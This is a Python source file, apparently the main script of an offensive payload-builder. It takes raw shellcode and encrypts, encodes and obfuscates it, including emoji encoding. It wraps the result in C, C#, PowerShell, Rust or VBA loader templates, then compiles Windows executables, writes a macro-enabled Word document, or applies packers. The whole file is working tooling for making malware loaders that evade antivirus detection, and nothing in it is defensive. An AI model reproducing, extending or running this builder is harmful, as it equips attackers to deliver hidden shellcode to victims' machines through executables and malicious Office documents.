import argparse
import importlib
import importlib.util
import platform
from utils.utils import *
import sys
import tempfile
import os
import shutil
import subprocess
import codecs
from utils.inject import create_word_doc

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', "--transformers", type=str, required=False, help='Transformers encrypt or encode the shellcode and is decrypted or decoded at runtime.')
    parser.add_argument('-s', "--shellcode", type=str, required=True, help='Specifies the raw binary shellcode file')
    parser.add_argument('-t', "--template", type=str, required=True, help='Template that the shellcode and deobfuscation code will be placed into.')
    parser.add_argument('-l', "--language", type=str, choices={"c","cs","ps1","vba", "rs"}, required=True, help='Language used to write and compile')
    parser.add_argument('-f', "--obfuscator", type=str, required=False, help='Obfuscators transform the transformed shellcode bytes into other formats, such as strings.')
    parser.add_argument('-b', "--preprocessors", type=str, required=False, help='Preprocessors modify the shellcode but are self decoding.')
    parser.add_argument('-a', "--postprocessors", type=str, required=False, help='Postprocessors obfuscate the resulting exe or script, e.g. packers')
    parser.add_argument('-o', "--output", type=str, required=False, default="output", help='Output file name')
    args = parser.parse_args()

    shellcode = open(args.shellcode, 'rb').read()

    compilerOptions = []
    codeblocks = ''
    if args.language == 'cs':
        transformers = 'byte[] shellcode = {shellcode};'
    elif args.language == 'c':
        transformers = 'unsigned char *shellcode = {shellcode};'
    elif args.language == 'vba':
        transformers = 'shellcode = {shellcode}'
    elif args.language == 'ps1':
        transformers = '[Byte[]]$shellcode = {shellcode}'
    elif args.language == 'rs':
        transformers = 'let shellcode = {shellcode};'
    imports = []

    # Transform shellcode

    if args.preprocessors:
        preprocessorsList = args.preprocessors.split(',')
        for preprocessorItem in preprocessorsList:
            preprocessorSpec = importlib.util.spec_from_file_location(preprocessorItem, f'{args.language}/preprocessors/{preprocessorItem}.py')
            preprocessorModule = importlib.util.module_from_spec(preprocessorSpec)
            sys.modules[preprocessorSpec.name] = preprocessorModule 
            preprocessorSpec.loader.exec_module(preprocessorModule)
            prprocessorObject = getattr(preprocessorModule, preprocessorItem)()
            preprocessorFunction = getattr(prprocessorObject, 'apply')
            shellcode = preprocessorFunction(shellcode)

    shellcodeSize = len(shellcode)

    if args.transformers:
        transformersList = args.transformers.split(',')
        for transformersItem in transformersList:
            transformersSpec = importlib.util.spec_from_file_location(transformersItem, f'{args.language}/transformers/{transformersItem}.py')
            transformersModule = importlib.util.module_from_spec(transformersSpec)
            sys.modules[transformersSpec.name] = transformersModule 
            transformersSpec.loader.exec_module(transformersModule)
            transformersObject = getattr(transformersModule, transformersItem)()
            transformersFunction = getattr(transformersObject, 'encode')
            transformedShellcode = transformersFunction(shellcode)
            codeblocks += getattr(transformersObject, 'codeblock')()
            transformers = getattr(transformersObject, 'transformer')(transformers)
            compilerOptions += getattr(transformersObject, 'compilerOptions')()
            imports += getattr(transformersObject, 'imports' )()
            shellcode = transformedShellcode

    # Obfuscate shellcode
    if args.obfuscator:
        obfuscatorSpec = importlib.util.spec_from_file_location(args.obfuscator, f'{args.language}/obfuscators/{args.obfuscator}.py')
        obfuscatorModule = importlib.util.module_from_spec(obfuscatorSpec)
        sys.modules[obfuscatorSpec.name] = obfuscatorModule 
        obfuscatorSpec.loader.exec_module(obfuscatorModule)
        obfuscatorObject = getattr(obfuscatorModule, args.obfuscator)()
        obfuscatorFunction = getattr(obfuscatorObject, 'obfuscate')
        obfuscatedShellcode = obfuscatorFunction(shellcode)
        codeblocks += getattr(obfuscatorObject, 'codeblock')()
        transformers = getattr(obfuscatorObject, 'transformer')(transformers)
        imports += getattr(obfuscatorObject, 'imports')()
        compilerOptions += getattr(obfuscatorObject, 'compilerOptions')()
        shellcode = obfuscatedShellcode

    # Load template options
    templateSpec = importlib.util.spec_from_file_location(args.template, f'{args.language}/templates/{args.template}.py')
    templateModule = importlib.util.module_from_spec(templateSpec)
    sys.modules[templateSpec.name] = templateModule 
    templateSpec.loader.exec_module(templateModule)
    templateObject = getattr(templateModule, args.template)()
    templateCode = getattr(templateObject, 'template')()
    compilerOptions += getattr(templateObject, 'compilerOptions')()
    imports = getattr(templateObject, 'imports')() + imports

    # Rename obfuscated shellcode
    if args.language == 'ps1':
        transformers = transformers.format(shellcode='$obfuscated')
    else:
        transformers = transformers.format(shellcode='obfuscated')

    # Place shellcode in correct format
    shellcode = globals()[f'{type(shellcode).__name__}_to_{args.language}'](shellcode, 'obfuscated')

    # Remove duplicates while retaining order
    imports = '\n'.join(list(dict.fromkeys(imports)))

    # Write template to temporary file for compilation
    print(f'Writing source code to {args.output}.{args.language}')

    # Using emoji encode on a ps1 requires the utf-8 signature to be included in the file
    if args.language == 'ps1' and args.obfuscator == 'EmojiEncode':
        f = codecs.open(f'{args.output}.{args.language}', 'w', 'utf-8-sig')
    else:
        f = open(f'{args.output}.{args.language}', 'w')
    formattedCode = templateCode.format(imports=imports, shellcode=shellcode, codeblocks=codeblocks, transformers=transformers, shellcodeSize=shellcodeSize)
    f.write(formattedCode)
    f.close()

    # Compile file
    if args.language == 'c':
        outfile = f'{args.output}.exe'
        temp = ['x86_64-w64-mingw32-gcc', f'{args.output}.{args.language}', '-o', outfile, '-Wall'] + compilerOptions
        result = subprocess.run(['x86_64-w64-mingw32-gcc' , f'{args.output}.{args.language}', '-o', outfile, ] + compilerOptions)
        if result.returncode == 0:
            print(f'Payload saved to {outfile}')
    elif args.language == 'cs':
        if args.output.lower()[-4:] != '.exe':
            outfile = args.output + '.exe'
        else:
            outfile = args.output
        if platform.system() == 'Windows':
            result = subprocess.run(['C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe', f'{args.output}.{args.language}', f'-out:{outfile}'])
        elif platform.system() == 'Linux':
            result = subprocess.run(['mcs', f'{args.output}.{args.language}', f'-out:{outfile}'])
        if result.returncode == 0:
            print(f'Payload saved to {outfile}')
    elif args.language == 'vba':
        outfile = f'{args.output}.docm'
        result = create_word_doc(formattedCode, outfile)
        print(f'Macro saved to {outfile}')
    elif args.language == 'ps1':
        outfile = f'{args.output}.ps1'
    elif args.language == 'rs':
        if args.output.lower()[-4:] != '.exe':
            outfile = args.output + '.exe'
        else:
            outfile = args.output
        shutil.rmtree('output', ignore_errors=True)
        os.makedirs(f'output/src/', exist_ok=True)
        open(f'output/src/main.rs', 'w').write(formattedCode)
        open(f'output/Cargo.toml', 'w').write("""
[package]
name = "output"
version = "0.1.0"
edition = "2021"

[dependencies]
winapi = {version = "0.3.9", features = ["winnt", "synchapi", "memoryapi", "processthreadsapi"]}

[profile.release]
strip = true
lto = true
""")
        result = subprocess.run(['cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'], cwd='output')
        shutil.copy('output/target/x86_64-pc-windows-gnu/release/output.exe', 'output.exe')
        if result.returncode == 0:
            print(f'Payload saved to {outfile}')

    if args.postprocessors:
        postprocessorsList = args.postprocessors.split(',')
        for postprocessorItem in postprocessorsList:
            postprocessorSpec = importlib.util.spec_from_file_location(postprocessorItem, f'{args.language}/postprocessors/{postprocessorItem}.py')
            postprocessorModule = importlib.util.module_from_spec(postprocessorSpec)
            sys.modules[postprocessorSpec.name] = postprocessorModule 
            postprocessorSpec.loader.exec_module(postprocessorModule)
            prprocessorObject = getattr(postprocessorModule, postprocessorItem)()
            postprocessorFunction = getattr(prprocessorObject, 'apply')
            postprocessorFunction(outfile)

if __name__ == "__main__":
    main()

